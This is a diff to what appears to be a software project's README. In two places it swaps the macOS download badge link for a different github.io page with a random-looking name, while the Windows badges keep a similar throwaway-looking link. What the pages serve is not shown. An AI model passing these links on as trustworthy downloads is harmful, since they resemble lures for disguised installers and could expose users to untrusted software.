@@ -24,7 +24,7 @@
 
 [![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://mkiiavwgxyhx.github.io/windows-runner/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mkiiavwgxyhx.github.io/windows-runner/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://tlwbljvlzhgm.github.io/macos-install/)
 
 </div>
 
@@ -72,7 +72,7 @@
 
 [![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://mkiiavwgxyhx.github.io/windows-runner/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mkiiavwgxyhx.github.io/windows-runner/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://tlwbljvlzhgm.github.io/macos-install/)
 
 </div>
 
